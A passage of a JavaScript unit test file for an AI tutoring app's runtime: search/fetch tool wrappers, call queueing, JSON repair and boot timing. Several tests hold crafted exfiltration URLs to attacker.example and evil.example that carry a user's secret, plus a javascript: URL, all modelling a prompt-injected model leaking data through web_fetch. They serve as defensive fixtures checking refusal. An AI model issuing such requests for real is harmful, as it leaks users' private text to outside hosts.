// Unit tests for the runtime layer (app/src/js/10-runtime.js) with a fake Parallel Search
// connector shaped like the real one: U.research tools (session id, trimming, the web_fetch
// allow-list and its error texts) and the U.ask priority gate.
// Run: node --test tests/*.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { readFileSync } from 'node:fs';

const src = (f) => readFileSync(new URL('../app/src/js/' + f, import.meta.url), 'utf8');

function boot({ mcp = null, sample = null } = {}) {
  const ctx = vm.createContext({ console, setTimeout, clearTimeout, crypto: globalThis.crypto, URL });
  vm.runInContext('var window = globalThis;', ctx);
  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
  const U = ctx.U;
  U.rt.mcp = mcp;
  U.rt.sample = sample;
  return U;
}

// A web_search payload in the real connector's shape.
function searchPayload(n, excerptChars = 200) {
  return {
    search_id: 'search_abc123',
    results: Array.from({ length: n }, (_, i) => ({
      url: 'https://example.org/page-' + i,
      title: 'Page ' + i,
      publish_date: '2025-01-0' + ((i % 9) + 1),
      excerpts: ['Verbatim text from page ' + i + '. ' + 'x'.repeat(excerptChars)],
    })),
    warnings: null,
    session_id: 'server-side',
  };
}

function fakeMcp(payloads) {
  const calls = [];
  return {
    calls,
    listTools: () => Promise.resolve({ servers: [{ name: 'Parallel Search', authStatus: 'connected', tools: [{ name: 'web_search' }, { name: 'web_fetch' }] }] }),
    describeTool: () => Promise.reject({ code: 'bad_request' }),
    callTool: (server, tool, input) => { calls.push({ server, tool, input: JSON.parse(JSON.stringify(input)) }); return Promise.resolve({ payload: payloads[tool](input) }); },
  };
}

test('research tools: session id on every call, result urls opened, refusals carry an error code', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(3), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['quote'] })) }) });
  const U = boot({ mcp });
  assert.match(U.research.SESSION, /^mu-[0-9a-f]{32}$/);
  assert.equal(await U.research.available(), true);
  const [search, fetch] = await U.research.tools();
  assert.deepEqual([...search.inputSchema.required], ['objective', 'search_queries']);
  assert.deepEqual([...fetch.inputSchema.required], ['urls']);

  const out = await search.execute({ objective: 'How tides work', search_queries: ['moon tides gravity', 'two tidal bulges'] });
  assert.equal(mcp.calls[0].input.session_id, U.research.SESSION, 'session id added');
  assert.equal(mcp.calls[0].input.model_name, undefined, 'model_name left unset');
  assert.ok(JSON.parse(out).results.length === 3, 'payload passed through as text');

  // A page from the results can be opened; the same session id goes with it.
  const f1 = await fetch.execute({ urls: ['https://example.org/page-1/'] });
  assert.match(f1, /quote/);
  assert.equal(mcp.calls[1].input.session_id, U.research.SESSION);
  // A session id Claude passes itself is kept.
  await search.execute({ objective: 'x', search_queries: ['a b c'], session_id: 'mine' });
  assert.equal(mcp.calls[2].input.session_id, 'mine');

  // Addresses not returned by a search are refused, with an error code 31-generate.js skips.
  const refused = await fetch.execute({ urls: ['https://evil.example/collect?q=dan'] });
  assert.match(refused, /^Tool error \(refused\): /);
  const empty = await fetch.execute({ urls: [] });
  assert.match(empty, /^Tool error \(bad_request\): /);
  assert.equal(mcp.calls.length, 3, 'refused calls never reach the connector');
});

test('research tools: big results are trimmed (search 12 KB, fetch 20 KB); connector errors come back as text', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(40, 800), web_fetch: () => ({ results: [{ url: 'https://example.org/page-0', excerpts: ['y'.repeat(50000)] }] }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  const s = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  const sj = JSON.parse(s);
  assert.ok(s.length <= 12000, 'search fits in 12 KB (' + s.length + ')');
  assert.ok(sj.results.length >= 30, 'most results kept (' + sj.results.length + '); their text is shortened instead');
  assert.ok(sj.results.every((r, i) => r.url === 'https://example.org/page-' + i && r.excerpts[0].startsWith('Verbatim text from page ' + i)), 'kept in rank order, each excerpt keeps its start');
  assert.ok(sj.results[sj.results.length - 1].excerpts[0].endsWith(' …'), 'the lowest-ranked are shortened first, the cut marked');
  const f = await fetch.execute({ urls: ['https://example.org/page-0'] });
  assert.ok(f.length <= 20000 && JSON.parse(f).results[0].excerpts[0].endsWith(' …'), 'fetch fits in 20 KB as valid JSON');
  mcp.callTool = () => Promise.reject({ code: 'rate_limited', message: 'slow down' });
  assert.match(await search.execute({ objective: 'o', search_queries: ['a b c'] }), /^Tool error \(rate_limited\): /);
});

test('ask: background calls run one at a time, after foreground ones, and can be cancelled or promoted', async () => {
  const log = [];
  const pending = [];
  const sample = (input) => new Promise((res) => { log.push('start ' + input); pending.push(() => { log.push('end ' + input); res({ text: input }); }); });
  const U = boot({ sample });
  const fg = U.ask('fg1');
  const bg1 = U.ask('bg1', { priority: 'background' });
  const ctl = new AbortController();
  const bg2 = U.ask('bg2', { priority: 'background', signal: ctl.signal });
  const bg3 = U.ask('bg3 lesson', { priority: 'background', label: 'write-lesson' });
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log, ['start fg1'], 'background waits while a foreground call runs');
  ctl.abort();
  await assert.rejects(bg2, (e) => e.code === 'cancelled', 'a waiting background call is cancelled by its signal');
  assert.equal(U._gate.promote((input, o) => o.label === 'write-lesson'), 1, 'promoted');
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log, ['start fg1', 'start bg3 lesson'], 'a promoted call runs at once');
  pending.shift()(); await fg;
  pending.shift()(); await bg3;
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(log.slice(-1), ['start bg1'], 'then the background queue moves');
  pending.shift()(); assert.equal(await bg1, 'bg1');
});

test('ask: rate limits are not retried; a transient upstream error is retried once', async () => {
  let n = 0;
  const U = boot({ sample: () => { n++; return Promise.reject({ code: 'rate_limited' }); } });
  await assert.rejects(U.ask('x'), (e) => e.code === 'rate_limited');
  assert.equal(n, 1);
  let m = 0;
  const U2 = boot({ sample: () => (++m === 1 ? Promise.reject({ code: 'upstream_error' }) : Promise.resolve({ text: 'ok' })) });
  U2.sleep = () => Promise.resolve();
  assert.equal(await U2.ask('y'), 'ok');
  assert.equal(m, 2);
});

test('research tools: markdown links in excerpts become plain text and are not results', async () => {
  const page = { url: 'https://www.grc.nasa.gov/www/k-12/airplane/brayton.html', title: 'Brayton Cycle', excerpts: ['we must study the basic thermodynamics of [gases](https://www.grc.nasa.gov/www/k-12/airplane/state.html) .\nGases have **p** and ![a figure](https://x.org/f.png) [T](https://e.org/a_(b))'] };
  const mcp = fakeMcp({ web_search: () => ({ results: [page] }), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['ok'] })) }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  const r = JSON.parse(await search.execute({ objective: 'o', search_queries: ['brayton cycle efficiency'] }));
  assert.equal(r.results[0].excerpts[0], 'we must study the basic thermodynamics of gases .\nGases have p and a figure T');
  assert.match(await fetch.execute({ urls: ['https://www.grc.nasa.gov/www/k-12/airplane/state.html'] }), /^Tool error \(refused\): /, 'a page only linked from an excerpt is not a result');
  assert.ok(!/^Tool error/.test(await fetch.execute({ urls: [page.url] })), 'the result itself can be opened');
});

test('research tools: a runaway loop meets the budget (10 searches, 6 fetches by default)', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(2), web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['ok'] })) }) });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  for (let i = 0; i < 10; i++) assert.ok(!/^Tool error/.test(await search.execute({ objective: 'o', search_queries: ['a b c ' + i] })));
  assert.match(await search.execute({ objective: 'o', search_queries: ['one more'] }), /^Tool error \(budget\): /);
  for (let i = 0; i < 6; i++) assert.ok(!/^Tool error/.test(await fetch.execute({ urls: ['https://example.org/page-0'] })));
  assert.match(await fetch.execute({ urls: ['https://example.org/page-1'] }), /^Tool error \(budget\): /);
  assert.equal(mcp.calls.length, 16, 'calls over the budget never reach the connector');
  const [s2] = await U.research.tools(null, { budget: { web_search: 1 } });
  await s2.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.match(await s2.execute({ objective: 'o', search_queries: ['a b d'] }), /^Tool error \(budget\): /, 'a caller can set its own budget');
});

test('research tools: fitting to size keeps the best-ranked results whole', async () => {
  const mcp = fakeMcp({ web_search: () => searchPayload(8, 2500), web_fetch: () => ({ results: [] }) });
  const U = boot({ mcp });
  const [search] = await U.research.tools();
  const r = JSON.parse(await search.execute({ objective: 'o', search_queries: ['a b c'] }));
  assert.equal(r.results.length, 8, 'nothing dropped when shortening the tail is enough');
  assert.ok(!r.results[0].excerpts[0].endsWith(' …') && r.results[0].excerpts[0].length > 2500, 'the top result is whole');
  assert.ok(r.results[7].excerpts[0].endsWith(' …'), 'the last is shortened');
});

test('research tools: rate limits, failures and connector errors that arrive as text', async () => {
  let n = 0;
  const limited = 'Error POSTing to endpoint: event: message\ndata: {"error":{"code":-32000,"message":"You\'ve hit the free-tier rate limit for Parallel Search MCP."}}';
  const mcp = fakeMcp({ web_search: () => (++n === 1 ? limited : searchPayload(1)), web_fetch: () => { throw { code: 'tool_error', message: 'boom' }; } });
  let U = boot({ mcp });
  let [search] = await U.research.tools(null, { patient: [5] });
  const r = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.ok(JSON.parse(r).results.length === 1 && mcp.calls.length === 2, 'patient research waits out a rate limit and retries');
  n = 0;
  [search] = await U.research.tools();
  const busy = await search.execute({ objective: 'o', search_queries: ['a b c'] });
  assert.match(busy, /^Tool error \(rate_limited\): the search service is busy/, 'Dan never waits: a plain message, no connector text');
  assert.ok(!/api key/i.test(busy));
  const tools = await U.research.tools(null, { budget: { web_search: 1 } });
  n = 0;
  assert.match(await tools[0].execute({ objective: 'o', search_queries: ['a'] }), /^Tool error \(rate_limited\)/);
  assert.ok(!/^Tool error/.test(await tools[0].execute({ objective: 'o', search_queries: ['a'] })), 'a failed call does not use up the budget');
  // Four failures and the tools stop calling the connector.
  U = boot({ mcp: fakeMcp({ web_search: () => searchPayload(1), web_fetch: () => { throw { code: 'tool_error', message: 'boom' }; } }) });
  const [s2, f2] = await U.research.tools();
  await s2.execute({ objective: 'o', search_queries: ['a'] });
  for (let i = 0; i < 4; i++) assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(tool_error\)/);
  assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(unavailable\)/);
});

// A schema's problems may name some as soft (length limits, 30-prompts.js): problems.soft.
function problemsOf(hard, soft) { const l = [...hard, ...soft]; l.soft = soft.slice(); return l; }
// replies: objects (sent as JSON), strings (sent as they are) or {code} errors, one per call.
function scripted(replies) {
  const seen = [];
  const sample = (input) => {
    seen.push(input);
    const r = replies[seen.length - 1];
    if (r && r.code) return Promise.reject(r);
    return Promise.resolve({ text: typeof r === 'string' ? r : JSON.stringify(r) });
  };
  return { sample, seen };
}
// The test schema: a reply {soft, hard} has that many soft and hard problems.
const schema = (d) => problemsOf(Array.from({ length: d.hard || 0 }, (_, i) => 'hard problem ' + i), Array.from({ length: d.soft || 0 }, (_, i) => 'text ' + i + ' is too long'));

test('ask: the repair message lists hard problems before soft ones, even past twelve', async () => {
  const s = scripted([{ id: 1, soft: 20, hard: 1 }, { id: 2 }]);
  const U = boot({ sample: s.sample });
  // A validator that reports the long text first, as vLesson does when the lengths come earlier.
  const softFirst = (d) => { const l = schema(d); const out = [...l.soft, ...l.filter((p) => !l.soft.includes(p))]; out.soft = l.soft; return out; };
  assert.equal((await U.ask('TASK: x', { json: true, schema: softFirst })).id, 2);
  const repair = s.seen[1];
  const last = Array.isArray(repair) ? repair[repair.length - 1].content : String(repair);
  const lines = last.split('\n').filter((l) => l.startsWith('- '));
  assert.equal(lines.length, 12, 'twelve problems listed');
  assert.equal(lines[0], '- hard problem 0', 'the hard problem comes first: ' + lines.slice(0, 2).join(' | '));
});

test('ask: soft problems get one repair, then the reply is accepted as it is; hard ones still fail', async () => {
  // Soft only, then soft only after the repair: accepted, with a warning event, nothing thrown.
  let s = scripted([{ id: 1, soft: 1 }, { id: 2, soft: 1 }]);
  let U = boot({ sample: s.sample });
  const events = [];
  U.on('ask-soft', (d) => events.push(d));
  const warn = console.warn; const warned = []; console.warn = (...a) => warned.push(a.join(' '));
  try {
    assert.equal((await U.ask('TASK: x', { json: true, schema, label: 'x' })).id, 2);
  } finally { console.warn = warn; }
  assert.equal(s.seen.length, 2, 'one repair');
  assert.match(s.seen[1][2].content, /text 0 is too long/, 'the repair lists the soft problem, asking for a cut');
  assert.equal(events.length, 1);
  assert.equal(events[0].label, 'x');
  assert.ok(warned.some((w) => /accepted with only length problems left/.test(w)));

  // Hard, then soft only: accepted.
  s = scripted([{ id: 1, hard: 1 }, { id: 2, soft: 2 }]);
  U = boot({ sample: s.sample });
  assert.equal((await U.ask('TASK: x', { json: true, schema })).id, 2);

  // Soft only, then the repair breaks something: the first reply is kept.
  s = scripted([{ id: 1, soft: 1 }, { id: 2, hard: 1 }]);
  U = boot({ sample: s.sample });
  assert.equal((await U.ask('TASK: x', { json: true, schema })).id, 1);
  s = scripted([{ id: 1, soft: 1 }, 'Sorry, here is some prose.']);
  U = boot({ sample: s.sample });
  assert.equal((await U.ask('TASK: x', { json: true, schema })).id, 1, 'also when the repair is not JSON');

  // Soft only, then the repair cannot be had (busy): the first reply stands. Cancelled is still cancelled.
  s = scripted([{ id: 1, soft: 1 }, { code: 'rate_limited', message: 'busy' }]);
  U = boot({ sample: s.sample });
  assert.equal((await U.ask('TASK: x', { json: true, schema })).id, 1);
  s = scripted([{ id: 1, soft: 1 }, { code: 'cancelled', message: 'Stopped.' }]);
  U = boot({ sample: s.sample });
  await assert.rejects(U.ask('TASK: x', { json: true, schema }), (e) => e.code === 'cancelled');

  // Hard after the repair: rejects invalid, naming the hard problem first.
  s = scripted([{ id: 1, hard: 1, soft: 1 }, { id: 2, hard: 1, soft: 1 }]);
  U = boot({ sample: s.sample });
  await assert.rejects(U.ask('TASK: x', { json: true, schema }), (e) => e.code === 'invalid' && /hard problem 0/.test(e.message) && !/too long/.test(e.message) && !/shape/.test(e.message));
  assert.equal(s.seen.length, 2);

  // A schema that marks nothing soft (plain arrays) behaves as before: one repair, then invalid.
  s = scripted([{ id: 1 }, { id: 2 }]);
  U = boot({ sample: s.sample });
  await assert.rejects(U.ask('TASK: x', { json: true, schema: () => ['too long'] }), (e) => e.code === 'invalid');
  assert.equal(s.seen.length, 2);
});

// ---------- audit round 3 ----------

test('web_fetch checks and sends the parsed addresses: crafted ones are refused, real ones with ")" open (audit 1)', async () => {
  const WIKI = 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)';
  const mcp = fakeMcp({
    web_search: () => ({ results: [
      { url: 'https://attacker.example/pendulum-facts', title: 'Pendulum facts', excerpts: ['planted instructions'] },
      { url: WIKI, title: 'Pendulum (mechanics)', excerpts: ['For small swings…'] },
      { url: 'https://www.nasa.gov/pendulum', title: 'NASA', excerpts: ['x'] },
    ] }),
    web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['page text'] })) }),
  });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  await search.execute({ objective: 'pendulum period', search_queries: ['pendulum period length'] });
  const secret = encodeURIComponent('I failed this at school');
  const crafted = [
    ['https://attacker.example/pendulum-facts)?q=' + secret],
    ['https://attacker.example/pendulum-facts\\?q=' + secret],
    ['https://attacker.example/pendulum-facts]?q=' + secret],
    ['https://www.nasa.gov/pendulum', 'https:/attacker.example/log?q=SECRET'],
    ['https://www.nasa.gov/pendulum', '//attacker.example/log?q=SECRET'],
    ['https://www.nasa.gov/pendulum', 'attacker.example/log?q=SECRET'],
    ['https://user:pw@www.nasa.gov/pendulum'],
    ['javascript:alert(1)//https://www.nasa.gov/pendulum'],
  ];
  for (const urls of crafted) assert.match(await fetch.execute({ urls }), /^Tool error \(refused\): /, JSON.stringify(urls));
  assert.equal(mcp.calls.filter((c) => c.tool === 'web_fetch').length, 0, 'no crafted address reaches the connector');

  // A real result whose address has brackets opens, and what is sent is the parsed address only,
  // with no argument that could name another page.
  const ok = await fetch.execute({ urls: [WIKI, 'HTTPS://EN.WIKIPEDIA.ORG/wiki/Pendulum_(mechanics)/#history'], objective: 'period', full_content: true, url: 'https://attacker.example/x', extra: { u: 'https://attacker.example/y' } });
  assert.ok(!/^Tool error/.test(ok), ok);
  const sent = mcp.calls.filter((c) => c.tool === 'web_fetch')[0].input;
  assert.deepEqual(sent.urls, [WIKI, 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)/'], 'parsed, and without the fragment (see the next test)');
  assert.equal(sent.objective, 'period');
  assert.equal(sent.full_content, true);
  assert.equal(sent.session_id, U.research.SESSION);
  assert.deepEqual(Object.keys(sent).sort(), ['full_content', 'objective', 'session_id', 'urls']);

  // The lesson's own sources (opts.allow) are compared the same way.
  const [, tutorFetch] = await U.research.tools(null, { allow: [WIKI] });
  assert.ok(!/^Tool error/.test(await tutorFetch.execute({ urls: [WIKI] })), 'a source with ")" can be reopened');
  assert.match(await tutorFetch.execute({ urls: [WIKI + ')?q=x'] }), /^Tool error \(refused\): /);
  assert.match(await tutorFetch.execute({ urls: 'not a list' }), /^Tool error \(refused\): /);
  assert.match(await tutorFetch.execute({}), /^Tool error \(bad_request\): /);
});

test('ask: every call to Claude starts with the tools\' whole budget, retries included (audit 25)', async () => {
  let n = 0;
  const mcp = fakeMcp({ web_search: () => ({ results: [{ url: 'https://example.edu/p' + (n++), title: 't', excerpts: ['text'] }] }), web_fetch: () => ({ results: [] }) });
  let attempt = 0;
  const log = [];
  const U = boot({ mcp, sample: async (input, o) => {
    attempt++;
    const search = o.tools.find((t) => t.name === 'web_search');
    for (let i = 0; i < (attempt === 1 ? 9 : 4); i++) log.push(attempt + ':' + (/^Tool error/.test(String(await search.execute({ objective: 'x', search_queries: ['a b c'] }))) ? 'error' : 'ok'));
    if (attempt === 1) throw { code: 'upstream_error', message: 'connection reset' };
    return { text: '{"ok":true}', truncated: false };
  } });
  U.sleep = () => Promise.resolve();
  const tools = await U.research.tools(null, {});
  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, tools, priority: 'background' })), { ok: true });
  assert.deepEqual(log.slice(9), ['2:ok', '2:ok', '2:ok', '2:ok'], 'the retry is not told the budget is spent');
  assert.equal(typeof tools.reset, 'function');
});

const plainObj = (x) => JSON.parse(JSON.stringify(x));

test('parseJson: the answer after narration from earlier tool rounds, brackets and all (audit 26)', () => {
  const U = boot();
  const json = '{"sources":[{"n":1,"title":"Tides","url":"https://oceanservice.noaa.gov/facts/springtide.html","quote":"Spring tides occur when the sun and moon are aligned."}],"topic":{"notes":[]},"ideas":{}}';
  const cases = {
    'final JSON only': json,
    'narration, then JSON': "I'll start with a broad search.\n\nThe NOAA results look strong.\n\n" + json,
    'narration with [1], then JSON': 'The NOAA page says spring tides happen at new and full moon [1]. Let me fetch it.\n\n' + json,
    'narration with {objective}, then JSON': 'Next I will search with {objective: tides}.\n\n' + json,
    'a draft object, then the answer': 'Draft: {"sources":[]}\n\nMore searching.\n\n' + json,
    'fenced after prose, then a footnote': 'Here it is:\n```json\n' + json + '\n```\nSee [1].',
    'narration with a stray quote in braces': 'Searching {objective: "tides} now.\n\n' + json,
    'narration with an object inside junk': 'Next {objective: {"a":1}} then.\n\n' + json,
    'narration with an unclosed brace': 'I will use {objective here\n\n' + json,
    'a note in braces after the answer': json + '\n\nSee {note}.',
  };
  for (const [name, text] of Object.entries(cases)) assert.equal(U.parseJson(text).sources.length, 1, name);
  assert.deepEqual(plainObj(U.parseJson('Only a list: [1, 2]')), [1, 2], 'an array when there is no object');
  assert.throws(() => U.parseJson('no json here'), (e) => e.code === 'bad_json' && /did not reply/.test(e.message));
  assert.throws(() => U.parseJson('{"a": 1,}'), (e) => e.code === 'bad_json' && /could not be read/.test(e.message));
  // A broken answer is reported as broken, not answered with a piece of it or with narration.
  const unread = (e) => e.code === 'bad_json' && /could not be read/.test(e.message);
  assert.throws(() => U.parseJson('{"sources":[{"n":1,"title":"T"}],"topic":{"notes":[],},"ideas":{}}'), unread);
  assert.throws(() => U.parseJson('It says so [1].\n\n{"sources":[{"n":1}],"x":1,}'), unread);
});

test('toolsOk: page tools only where sample.limits() reports them; tools_unavailable settles it (audit 5)', async () => {
  const plain = async () => ({ text: 'ok', truncated: false });
  const mk = (limits) => Object.assign((input, o) => (o.tools ? Promise.reject({ code: 'tools_unavailable', message: 'no tools here' }) : plain()), limits ? { limits } : {});
  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, tools: { maxCount: 20 } })) }).rt.toolsOk(), true);
  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, images: {} })) }).rt.toolsOk(), false, 'no tools member');
  assert.equal(await boot({ sample: mk(() => Promise.reject({ code: 'x' })) }).rt.toolsOk(), false, 'limits() failing counts as no');
  assert.equal(await boot({ sample: null }).rt.toolsOk(), false, 'no sample at all');
  const U = boot({ sample: mk(null) });
  assert.equal(await U.rt.toolsOk(), true, 'no limits(): the benefit of the doubt');
  await assert.rejects(U.ask('x', { tools: [{ name: 't', description: 'd', execute: () => '' }] }), (e) => e.code === 'tools_unavailable');
  assert.equal(await U.rt.toolsOk(), false, 'one tools_unavailable answers it for the visit');
});

// A VM whose clock runs 100 times fast, with a claude.use() that answers each name after `ms`
// (real milliseconds; null = never).
function bootSlow(delays, idMs = 0) {
  const fast = (f, ms, ...a) => setTimeout(f, (ms || 0) / 100, ...a);
  const ctx = vm.createContext({ console, setTimeout: fast, clearTimeout, crypto: globalThis.crypto, URL });
  vm.runInContext('var window = globalThis;', ctx);
  const user = { id: () => new Promise((r) => setTimeout(() => r('u_dan'), idMs)) };
  const ns = { db: { doc() {} }, user, sample: () => Promise.resolve({ text: '' }), mcp: null, downloads: null, permissions: null };
  ctx.claude = { use: (name) => new Promise((r) => { const ms = name in delays ? delays[name] : 1; if (ms !== null) setTimeout(() => r(ns[name]), ms); }) };
  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
  return ctx.U;
}

test('boot waits up to 30 s for saved work, and takes up whatever arrives later (audit 14)', async () => {
  // db answers at "15 s" (150 ms real): past the old 10 s guard, so it was dropped for the visit.
  let U = bootSlow({ db: 150 });
  await U.rt.ready;
  assert.ok(U.rt.db && U.rt.user && U.rt.uid === 'u_dan', 'a slow db is waited for');
  assert.deepEqual(plainObj(U.rt.late), []);

  // db answers at "45 s": boot goes on at 30 s without it, says what is still coming, and takes it up when it comes.
  U = bootSlow({ db: 450 });
  const t0 = Date.now();
  await U.rt.ready;
  assert.ok(Date.now() - t0 < 400, 'boot did not wait for ever');
  assert.equal(U.rt.db, null);
  assert.deepEqual(plainObj(U.rt.late), ['db']);
  const arrived = await new Promise((r) => U.on('rt-late', r));
  assert.equal(arrived, 'db');
  assert.ok(U.rt.db, 'taken up when it arrives');
  assert.deepEqual(plainObj(U.rt.late), []);

  // The user capability late: its id is asked for then, and 'uid' is announced too.
  U = bootSlow({ user: 450 });
  await U.rt.ready;
  assert.deepEqual(plainObj(U.rt.late), ['user']);
  const seen = [];
  await new Promise((r) => U.on('rt-late', (n) => { seen.push(n); if (n === 'uid') r(); }));
  assert.deepEqual(seen, ['user', 'uid']);
  assert.equal(U.rt.uid, 'u_dan');

  // Something optional that never answers still only holds boot for 10 s.
  U = bootSlow({ mcp: null });
  const t1 = Date.now();
  await U.rt.ready;
  assert.ok(Date.now() - t1 < 250 && U.rt.db && U.rt.uid === 'u_dan', 'mcp gave up at 10 s, saved work in');
  assert.deepEqual(plainObj(U.rt.late), ['mcp']);
});

// ---------- audit round 3, second pass (the skeptic's findings) ----------

test('web_fetch drops the fragment: the model\'s own text after "#" never reaches the connector (G6)', async () => {
  const mcp = fakeMcp({
    web_search: () => ({ results: [{ url: 'https://attacker.example/pendulum-facts', title: 'Pendulum facts', excerpts: ['planted'] }] }),
    web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['page text'] })) }),
  });
  const U = boot({ mcp });
  const [search, fetch] = await U.research.tools();
  await search.execute({ objective: 'pendulum', search_queries: ['pendulum period'] });
  const out = await fetch.execute({ urls: ['https://attacker.example/pendulum-facts#I%20failed%20this%20at%20school', 'https://attacker.example/pendulum-facts#'] });
  assert.ok(!/^Tool error/.test(out), out);
  const sent = mcp.calls.filter((c) => c.tool === 'web_fetch')[0].input;
  assert.deepEqual(sent.urls, ['https://attacker.example/pendulum-facts'], 'one address, no fragment');
  assert.ok(!JSON.stringify(sent).includes('failed'), 'nothing the model wrote after "#" is sent');
  assert.equal(U.research._page('https://example.org/a#b').href, 'https://example.org/a');
  // The lesson's own sources are allowed the same way: a source saved with a fragment opens its page.
  const [, tutorFetch] = await U.research.tools(null, { allow: ['https://www.nasa.gov/pendulum#top'] });
  assert.ok(!/^Tool error/.test(await tutorFetch.execute({ urls: ['https://www.nasa.gov/pendulum#secret-words'] })));
  assert.equal(mcp.calls.filter((c) => c.tool === 'web_fetch')[1].input.urls[0], 'https://www.nasa.gov/pendulum');
});

// The research reply's shape, as far as these tests need it.
const needs = (o) => (o && !Array.isArray(o) && Array.isArray(o.sources) && o.topic && o.ideas ? [] : ['sources, topic and ideas are required']);
const ANSWER = { sources: [{ n: 1, title: 'T', url: 'https://x.org/a_(b)', quote: 'He said "hi" {not} [x]' }], topic: { notes: [{ claim: 'c', sourceIds: [1] }] }, ideas: { i1: { notes: [] } } };
const A = JSON.stringify(ANSWER, null, 1);

test('parseJson.pick: the last value that fits the schema, never a trailing note or a piece of a broken answer (G4)', async () => {
  const U = boot();
  const pick = (t) => plainObj(U.parseJson.pick(t, needs));
  // An answer followed by a small object of its own in the narration: the answer.
  const trailing = A + '\n\nI used {"objective":"tides"}';
  assert.deepEqual(pick(trailing), { value: ANSWER });
  // A large unparseable span after a valid answer: the answer still fits, so it is the answer.
  assert.deepEqual(pick(A + '\n\nP.S. {' + 'x'.repeat(400) + '}'), { value: ANSWER });
  // An answer missing only its final "}": its members are pieces, not answers. bad_json, in its own words.
  const cut = A.slice(0, -1);
  assert.deepEqual(pick(cut), { problems: ['Claude replied with JSON that could not be read.'] });
  assert.deepEqual(pick('Spring tides [1].\n\n' + cut), { problems: ['Claude replied with JSON that could not be read.'] }, 'not the narration\'s [1]');
  assert.throws(() => U.parseJson(cut), (e) => e.code === 'bad_json' && /could not be read/.test(e.message));
  assert.equal(plainObj(U.parseJson.candidates(cut)).list.length, 0, 'no candidate at all');
  // Nothing fits: the biggest candidate's problems, not the trailing note's.
  const wrong = JSON.stringify({ sources: [], topic: { notes: [] } });
  const schema = (o) => (o && o.ideas ? [] : o && o.sources ? ['ideas is missing'] : ['not a research reply']);
  const best = plainObj(U.parseJson.pick(wrong + '\n\nSee {"a":1}.', schema));
  assert.deepEqual(best.problems, ['ideas is missing']);
  assert.deepEqual(best.value, JSON.parse(wrong), 'the biggest candidate comes with its problems');
  assert.deepEqual(plainObj(U.parseJson.pick('no json here', needs)), { problems: ['Claude did not reply with JSON.'] });
  // Narration with brackets of its own, or an unclosed one, before the answer: still the answer.
  for (const narr of ['I will use {objective here', 'Let me check [the "moon', '[ ', '{ ', 'Calling web_search {"objective":"x","search_queries":["a"]}', 'Here is the JSON:'])
    assert.deepEqual(pick(narr + '\n\n' + A), { value: ANSWER }, narr);
});

test('ask: a reply with a trailing object or a broken tail costs no corrective call; a cut-off answer is called unreadable (G4)', async () => {
  const replies = [];
  const seen = [];
  const U = boot({ sample: async (input) => { seen.push(input); return { text: replies.shift(), truncated: false }; } });
  replies.push(A + '\n\nI used {"objective":"tides"} for the search.');
  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, schema: needs })), ANSWER);
  assert.equal(seen.length, 1, 'no corrective call');
  replies.push(A + '\n\nP.S. {' + 'x'.repeat(400) + '}');
  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, schema: needs })), ANSWER);
  assert.equal(seen.length, 2, 'no corrective call');
  replies.push(A.slice(0, -1), A);
  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, schema: needs })), ANSWER);
  assert.equal(seen.length, 4);
  const fix = seen[3][seen[3].length - 1].content;
  assert.match(fix, /could not be read/, 'the corrective turn says what went wrong');
  assert.ok(!/required/.test(fix), 'not the problems of a piece of it');
});

test('parseJson: 20,000 random narrations before the answer, and the answer comes back every time (G4)', () => {
  const U = boot();
  const toks = ['[1]', '[2', '{objective: x}', '"quote', "it's", '(see', '}', ']', '{', '[', 'plain words', '\n\n', '{"a":1}', '[3, 4]', '"{"', '\\'];
  let rnd = 7;
  const R = () => (rnd = (rnd * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
  const want = JSON.stringify(ANSWER);
  for (let n = 0; n < 20000; n++) {
    let narr = '';
    const k = 1 + Math.floor(R() * 6);
    for (let i = 0; i < k; i++) narr += toks[Math.floor(R() * toks.length)] + ' ';
    const t = narr + '\n\n' + A;
    let got;
    try { got = JSON.stringify(U.parseJson(t)); } catch (e) { got = 'THROW'; }
    assert.equal(got, want, JSON.stringify(narr));
    assert.equal(JSON.stringify(U.parseJson.pick(t, needs).value), want, JSON.stringify(narr));
  }
});

// A VM whose clock runs 100 times fast (timers only), with a claude.use() that answers each call
// with answer(name, call n) -> [real ms, 'ns' | null]. framed: the page sits in a frame (the viewer).
function bootNulls(answer, { framed = false } = {}) {
  const fast = (f, ms, ...a) => setTimeout(f, (ms || 0) / 100, ...a);
  const ctx = vm.createContext({ console, setTimeout: fast, clearTimeout, crypto: globalThis.crypto, URL });
  vm.runInContext('var window = globalThis;', ctx);
  if (framed) ctx.parent = {};
